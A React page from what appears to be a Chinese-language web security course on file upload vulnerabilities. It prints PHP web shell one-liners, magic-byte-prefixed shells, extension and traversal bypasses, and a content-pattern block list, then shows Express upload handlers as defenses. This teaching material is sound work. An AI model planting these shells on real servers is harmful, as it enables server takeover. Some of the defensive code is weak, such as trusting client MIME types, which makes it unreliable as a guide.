"use client";
import { useState } from "react";
import Link from "next/link";

export default function FileUploadSecurityPage() {
  const [activeTab, setActiveTab] = useState("overview");

  return (
    <div className="container mx-auto px-4 py-8">
      <h1 className="text-3xl font-bold mb-8">文件上传安全</h1>
      
      {/* 标签页导航 */}
      <div className="flex space-x-4 mb-6 border-b overflow-x-auto">
        <button
          onClick={() => setActiveTab("overview")}
          className={`px-4 py-2 font-medium whitespace-nowrap ${
            activeTab === "overview"
              ? "border-b-2 border-blue-500 text-blue-600"
              : "text-gray-500 hover:text-gray-700"
          }`}
        >
          攻击概述
        </button>
        <button
          onClick={() => setActiveTab("principle")}
          className={`px-4 py-2 font-medium whitespace-nowrap ${
            activeTab === "principle"
              ? "border-b-2 border-blue-500 text-blue-600"
              : "text-gray-500 hover:text-gray-700"
          }`}
        >
          攻击原理
        </button>
        <button
          onClick={() => setActiveTab("defense")}
          className={`px-4 py-2 font-medium whitespace-nowrap ${
            activeTab === "defense"
              ? "border-b-2 border-blue-500 text-blue-600"
              : "text-gray-500 hover:text-gray-700"
          }`}
        >
          防御方案
        </button>
        <button
          onClick={() => setActiveTab("cases")}
          className={`px-4 py-2 font-medium whitespace-nowrap ${
            activeTab === "cases"
              ? "border-b-2 border-blue-500 text-blue-600"
              : "text-gray-500 hover:text-gray-700"
          }`}
        >
          实战案例
        </button>
      </div>

      {/* 内容区域 */}
      <div className="bg-white rounded-lg shadow-md p-6">
        {activeTab === "overview" && (
          <div className="space-y-6">
            <h3 className="text-xl font-semibold mb-3">文件上传安全概述</h3>
            <div className="prose max-w-none">
              <h4 className="font-semibold">1. 文件上传漏洞定义</h4>
              <p className="mb-4">
                文件上传漏洞是指网站对用户上传的文件没有进行严格的验证和过滤，导致攻击者可以上传恶意文件（如WebShell、木马等），从而获取服务器控制权或执行恶意代码。
              </p>

              <h4 className="font-semibold">2. 攻击特点</h4>
              <div className="bg-gray-100 p-4 rounded-lg mb-4">
                <ul className="list-disc pl-6 mb-4">
                  <li>绕过文件类型验证</li>
                  <li>绕过文件内容验证</li>
                  <li>绕过文件大小限制</li>
                  <li>绕过文件路径验证</li>
                  <li>绕过文件权限验证</li>
                </ul>
              </div>

              <h4 className="font-semibold">3. 常见攻击场景</h4>
              <div className="bg-gray-100 p-4 rounded-lg mb-4">
                <ul className="list-disc pl-6 mb-4">
                  <li>头像上传</li>
                  <li>文件分享</li>
                  <li>图片上传</li>
                  <li>文档上传</li>
                  <li>视频上传</li>
                </ul>
                <pre className="bg-gray-200 p-2 rounded">
                  <code>{`// 攻击场景示例
1. 上传WebShell
<?php eval($_POST['cmd']); ?>

2. 上传木马
<?php system($_GET['cmd']); ?>

3. 上传恶意图片
GIF89a<?php system($_GET['cmd']); ?>

4. 上传恶意文档
%PDF-1.4
<?php system($_GET['cmd']); ?>

5. 上传恶意视频
RIFF<?php system($_GET['cmd']); ?>`}</code>
                </pre>
              </div>
            </div>
          </div>
        )}

        {activeTab === "principle" && (
          <div className="space-y-6">
            <h3 className="text-xl font-semibold mb-3">攻击原理</h3>
            <div className="prose max-w-none">
              <h4 className="font-semibold">1. 基本攻击流程</h4>
              <div className="bg-gray-100 p-4 rounded-lg mb-4">
                <ol className="list-decimal pl-6 mb-4">
                  <li>识别上传点</li>
                  <li>构造恶意文件</li>
                  <li>绕过验证</li>
                  <li>上传文件</li>
                  <li>访问文件</li>
                </ol>
                <pre className="bg-gray-200 p-2 rounded">
                  <code>{`// 攻击流程示例
1. 构造恶意文件
<?php
  $cmd = $_GET['cmd'];
  system($cmd);
?>

2. 修改文件类型
Content-Type: image/jpeg

3. 修改文件内容
GIF89a
<?php system($_GET['cmd']); ?>

4. 修改文件扩展名
shell.php.jpg

5. 访问WebShell
http://example.com/uploads/shell.php?cmd=id`}</code>
                </pre>
              </div>

              <h4 className="font-semibold">2. 攻击类型</h4>
              <div className="bg-gray-100 p-4 rounded-lg mb-4">
                <ul className="list-disc pl-6 mb-4">
                  <li>客户端验证绕过</li>
                  <li>服务端验证绕过</li>
                  <li>文件类型绕过</li>
                  <li>文件内容绕过</li>
                  <li>文件路径绕过</li>
                </ul>
                <pre className="bg-gray-200 p-2 rounded">
                  <code>{`// 1. 客户端验证绕过
// 修改文件扩展名
shell.php -> shell.jpg

// 2. 服务端验证绕过
// 修改Content-Type
Content-Type: image/jpeg

// 3. 文件类型绕过
// 添加文件头
GIF89a
<?php system($_GET['cmd']); ?>

// 4. 文件内容绕过
// 使用图片木马
// 使用文档木马
// 使用视频木马

// 5. 文件路径绕过
// 使用目录遍历
../../../shell.php`}</code>
                </pre>
              </div>

              <h4 className="font-semibold">3. 攻击技巧</h4>
              <div className="bg-gray-100 p-4 rounded-lg mb-4">
                <pre className="bg-gray-200 p-2 rounded">
                  <code>{`// 1. 文件类型绕过
// 修改Content-Type
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif

// 2. 文件扩展名绕过
shell.php.jpg
shell.php.png
shell.php.gif

// 3. 文件内容绕过
// 添加文件头
GIF89a
%PDF-1.4
RIFF

// 4. 文件路径绕过
// 使用目录遍历
../../../shell.php
..\\..\\..\\shell.php

// 5. 文件权限绕过
// 修改文件权限
chmod 777 shell.php`}</code>
                </pre>
              </div>
            </div>
          </div>
        )}

        {activeTab === "defense" && (
          <div className="space-y-6">
            <h3 className="text-xl font-semibold mb-3">防御方案</h3>
            <div className="prose max-w-none">
              <h4 className="font-semibold">1. 文件类型验证</h4>
              <div className="bg-gray-100 p-4 rounded-lg mb-4">
                <pre className="bg-gray-200 p-2 rounded">
                  <code>{`// 1. 验证文件扩展名
function validateFileExtension(filename) {
  const allowedExtensions = ['.jpg', '.jpeg', '.png', '.gif'];
  const ext = path.extname(filename).toLowerCase();
  return allowedExtensions.includes(ext);
}

// 2. 验证文件类型
function validateFileType(file) {
  const allowedTypes = ['image/jpeg', 'image/png', 'image/gif'];
  return allowedTypes.includes(file.mimetype);
}

// 3. 验证文件内容
function validateFileContent(file) {
  const fileHeader = file.buffer.slice(0, 8);
  const jpegHeader = Buffer.from([0xFF, 0xD8, 0xFF]);
  const pngHeader = Buffer.from([0x89, 0x50, 0x4E, 0x47]);
  const gifHeader = Buffer.from([0x47, 0x49, 0x46, 0x38]);
  
  return fileHeader.includes(jpegHeader) ||
         fileHeader.includes(pngHeader) ||
         fileHeader.includes(gifHeader);
}`}</code>
                </pre>
              </div>

              <h4 className="font-semibold">2. 文件内容验证</h4>
              <div className="bg-gray-100 p-4 rounded-lg mb-4">
                <pre className="bg-gray-200 p-2 rounded">
                  <code>{`// 1. 验证文件大小
function validateFileSize(file) {
  const maxSize = 5 * 1024 * 1024; // 5MB
  return file.size <= maxSize;
}

// 2. 验证文件内容
function validateFileContent(file) {
  const content = file.buffer.toString();
  const dangerousPatterns = [
    '<?php',
    '<?=',
    '<script',
    'eval(',
    'system(',
    'exec(',
    'shell_exec('
  ];
  
  return !dangerousPatterns.some(pattern => content.includes(pattern));
}

// 3. 验证文件格式
function validateFileFormat(file) {
  return new Promise((resolve, reject) => {
    const image = new Image();
    image.onload = () => resolve(true);
    image.onerror = () => reject(new Error('Invalid image format'));
    image.src = URL.createObjectURL(file);
  });
}`}</code>
                </pre>
              </div>

              <h4 className="font-semibold">3. 文件存储安全</h4>
              <div className="bg-gray-100 p-4 rounded-lg mb-4">
                <pre className="bg-gray-200 p-2 rounded">
                  <code>{`// 1. 生成随机文件名
function generateRandomFilename(originalFilename) {
  const ext = path.extname(originalFilename);
  const randomName = crypto.randomBytes(16).toString('hex');
  return randomName + ext;
}

// 2. 设置安全的存储路径
function getSecureStoragePath(filename) {
  const date = new Date();
  const year = date.getFullYear();
  const month = String(date.getMonth() + 1).padStart(2, '0');
  const day = String(date.getDate()).padStart(2, '0');
  
  return path.join('uploads', year.toString(), month, day, filename);
}

// 3. 设置文件权限
function setSecureFilePermissions(filepath) {
  fs.chmodSync(filepath, 0o644);
}`}</code>
                </pre>
              </div>

              <h4 className="font-semibold">4. 其他防御措施</h4>
              <div className="bg-gray-100 p-4 rounded-lg mb-4">
                <pre className="bg-gray-200 p-2 rounded">
                  <code>{`// 1. 使用CDN
const cdn = new CDN({
  domain: 'cdn.example.com',
  ssl: true,
  cache: true
});

// 2. 使用云存储
const s3 = new AWS.S3({
  accessKeyId: process.env.AWS_ACCESS_KEY_ID,
  secretAccessKey: process.env.AWS_SECRET_ACCESS_KEY,
  region: process.env.AWS_REGION
});

// 3. 使用文件扫描
const scanner = new FileScanner({
  antivirus: true,
  malware: true,
  phishing: true
});`}</code>
                </pre>
              </div>
            </div>
          </div>
        )}

        {activeTab === "cases" && (
          <div className="space-y-6">
            <h3 className="text-xl font-semibold mb-3">实战案例</h3>
            <div className="prose max-w-none">
              <h4 className="font-semibold">1. 头像上传防护</h4>
              <div className="bg-gray-100 p-4 rounded-lg mb-4">
                <pre className="bg-gray-200 p-2 rounded">
                  <code>{`// 1. 后端实现
import express from 'express';
import multer from 'multer';
import path from 'path';
import crypto from 'crypto';
import sharp from 'sharp';

const app = express();

// 配置multer
const storage = multer.memoryStorage();
const upload = multer({
  storage,
  limits: {
    fileSize: 5 * 1024 * 1024 // 5MB
  },
  fileFilter: (req, file, cb) => {
    const allowedTypes = ['image/jpeg', 'image/png', 'image/gif'];
    if (!allowedTypes.includes(file.mimetype)) {
      cb(new Error('不支持的文件类型'));
      return;
    }
    cb(null, true);
  }
});

// 处理头像上传
app.post('/api/avatar', upload.single('avatar'), async (req, res) => {
  try {
    if (!req.file) {
      return res.status(400).json({ error: '请选择文件' });
    }

    // 验证文件类型
    const allowedTypes = ['image/jpeg', 'image/png', 'image/gif'];
    if (!allowedTypes.includes(req.file.mimetype)) {
      return res.status(400).json({ error: '不支持的文件类型' });
    }

    // 验证文件大小
    if (req.file.size > 5 * 1024 * 1024) {
      return res.status(400).json({ error: '文件大小超过限制' });
    }

    // 生成随机文件名
    const ext = path.extname(req.file.originalname);
    const filename = crypto.randomBytes(16).toString('hex') + ext;

    // 处理图片
    const image = sharp(req.file.buffer);
    const metadata = await image.metadata();

    // 验证图片尺寸
    if (metadata.width > 2000 || metadata.height > 2000) {
      return res.status(400).json({ error: '图片尺寸超过限制' });
    }

    // 调整图片大小
    await image
      .resize(200, 200, {
        fit: 'cover',
        position: 'center'
      })
      .jpeg({ quality: 80 })
      .toFile(path.join('uploads', 'avatars', filename));

    res.json({ filename });
  } catch (error) {
    res.status(500).json({ error: '上传失败' });
  }
});

// 2. 前端实现
// 头像上传表单
<!DOCTYPE html>
<html>
<head>
  <title>头像上传</title>
</head>
<body>
  <form id="avatar-form">
    <input type="file" name="avatar" accept="image/*" required>
    <button type="submit">上传</button>
  </form>
  <div id="preview"></div>
  <script>
    document.getElementById('avatar-form').addEventListener('submit', async (e) => {
      e.preventDefault();
      const formData = new FormData(e.target);
      const response = await fetch('/api/avatar', {
        method: 'POST',
        body: formData
      });
      if (response.ok) {
        const { filename } = await response.json();
        const preview = document.getElementById('preview');
        preview.innerHTML = \`<img src="/uploads/avatars/\${filename}" alt="Avatar">\`;
      }
    });
  </script>
</body>
</html>`}</code>
                </pre>
              </div>

              <h4 className="font-semibold">2. 文件分享防护</h4>
              <div className="bg-gray-100 p-4 rounded-lg mb-4">
                <pre className="bg-gray-200 p-2 rounded">
                  <code>{`// 1. 后端实现
import express from 'express';
import multer from 'multer';
import path from 'path';
import crypto from 'crypto';
import fs from 'fs';

const app = express();

// 配置multer
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    const dir = path.join('uploads', 'files');
    if (!fs.existsSync(dir)) {
      fs.mkdirSync(dir, { recursive: true });
    }
    cb(null, dir);
  },
  filename: (req, file, cb) => {
    const ext = path.extname(file.originalname);
    const filename = crypto.randomBytes(16).toString('hex') + ext;
    cb(null, filename);
  }
});

const upload = multer({
  storage,
  limits: {
    fileSize: 50 * 1024 * 1024 // 50MB
  },
  fileFilter: (req, file, cb) => {
    const allowedTypes = [
      'application/pdf',
      'application/msword',
      'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
      'application/vnd.ms-excel',
      'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet'
    ];
    if (!allowedTypes.includes(file.mimetype)) {
      cb(new Error('不支持的文件类型'));
      return;
    }
    cb(null, true);
  }
});

// 处理文件上传
app.post('/api/files', upload.single('file'), async (req, res) => {
  try {
    if (!req.file) {
      return res.status(400).json({ error: '请选择文件' });
    }

    // 验证文件类型
    const allowedTypes = [
      'application/pdf',
      'application/msword',
      'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
      'application/vnd.ms-excel',
      'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet'
    ];
    if (!allowedTypes.includes(req.file.mimetype)) {
      return res.status(400).json({ error: '不支持的文件类型' });
    }

    // 验证文件大小
    if (req.file.size > 50 * 1024 * 1024) {
      return res.status(400).json({ error: '文件大小超过限制' });
    }

    // 生成分享链接
    const shareId = crypto.randomBytes(8).toString('hex');
    const shareLink = \`/share/\${shareId}\`;

    // 保存分享信息
    await db.collection('shares').insertOne({
      id: shareId,
      filename: req.file.filename,
      originalname: req.file.originalname,
      mimetype: req.file.mimetype,
      size: req.file.size,
      path: req.file.path,
      createdAt: new Date(),
      expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000) // 7天后过期
    });

    res.json({ shareLink });
  } catch (error) {
    res.status(500).json({ error: '上传失败' });
  }
});

// 2. 前端实现
// 文件上传表单
<!DOCTYPE html>
<html>
<head>
  <title>文件分享</title>
</head>
<body>
  <form id="file-form">
    <input type="file" name="file" required>
    <button type="submit">上传</button>
  </form>
  <div id="share-link"></div>
  <script>
    document.getElementById('file-form').addEventListener('submit', async (e) => {
      e.preventDefault();
      const formData = new FormData(e.target);
      const response = await fetch('/api/files', {
        method: 'POST',
        body: formData
      });
      if (response.ok) {
        const { shareLink } = await response.json();
        const shareLinkDiv = document.getElementById('share-link');
        shareLinkDiv.innerHTML = \`<a href="\${shareLink}">分享链接</a>\`;
      }
    });
  </script>
</body>
</html>`}</code>
                </pre>
              </div>

              <h4 className="font-semibold">3. 图片上传防护</h4>
              <div className="bg-gray-100 p-4 rounded-lg mb-4">
                <pre className="bg-gray-200 p-2 rounded">
                  <code>{`// 1. 后端实现
import express from 'express';
import multer from 'multer';
import path from 'path';
import crypto from 'crypto';
import sharp from 'sharp';

const app = express();

// 配置multer
const storage = multer.memoryStorage();
const upload = multer({
  storage,
  limits: {
    fileSize: 10 * 1024 * 1024 // 10MB
  },
  fileFilter: (req, file, cb) => {
    const allowedTypes = ['image/jpeg', 'image/png', 'image/gif'];
    if (!allowedTypes.includes(file.mimetype)) {
      cb(new Error('不支持的文件类型'));
      return;
    }
    cb(null, true);
  }
});

// 处理图片上传
app.post('/api/images', upload.single('image'), async (req, res) => {
  try {
    if (!req.file) {
      return res.status(400).json({ error: '请选择文件' });
    }

    // 验证文件类型
    const allowedTypes = ['image/jpeg', 'image/png', 'image/gif'];
    if (!allowedTypes.includes(req.file.mimetype)) {
      return res.status(400).json({ error: '不支持的文件类型' });
    }

    // 验证文件大小
    if (req.file.size > 10 * 1024 * 1024) {
      return res.status(400).json({ error: '文件大小超过限制' });
    }

    // 生成随机文件名
    const ext = path.extname(req.file.originalname);
    const filename = crypto.randomBytes(16).toString('hex') + ext;

    // 处理图片
    const image = sharp(req.file.buffer);
    const metadata = await image.metadata();

    // 验证图片尺寸
    if (metadata.width > 4000 || metadata.height > 4000) {
      return res.status(400).json({ error: '图片尺寸超过限制' });
    }

    // 调整图片大小
    await image
      .resize(800, 800, {
        fit: 'inside',
        withoutEnlargement: true
      })
      .jpeg({ quality: 80 })
      .toFile(path.join('uploads', 'images', filename));

    res.json({ filename });
  } catch (error) {
    res.status(500).json({ error: '上传失败' });
  }
});

// 2. 前端实现
// 图片上传表单
<!DOCTYPE html>
<html>
<head>
  <title>图片上传</title>
</head>
<body>
  <form id="image-form">
    <input type="file" name="image" accept="image/*" required>
    <button type="submit">上传</button>
  </form>
  <div id="preview"></div>
  <script>
    document.getElementById('image-form').addEventListener('submit', async (e) => {
      e.preventDefault();
      const formData = new FormData(e.target);
      const response = await fetch('/api/images', {
        method: 'POST',
        body: formData
      });
      if (response.ok) {
        const { filename } = await response.json();
        const preview = document.getElementById('preview');
        preview.innerHTML = \`<img src="/uploads/images/\${filename}" alt="Image">\`;
      }
    });
  </script>
</body>
</html>`}</code>
                </pre>
              </div>
            </div>
          </div>
        )}
      </div>

      {/* 底部导航 */}
      <div className="mt-8 flex justify-between">
        <Link
          href="/study/security/frontend/sql"
          className="px-4 py-2 text-blue-600 hover:text-blue-800"
        >
          ← SQL注入防护
        </Link>
        <Link
          href="/study/security/frontend/sensitive"
          className="px-4 py-2 text-blue-600 hover:text-blue-800"
        >
           敏感信息保护 → 
        </Link>
      </div>
    </div>
  );
} 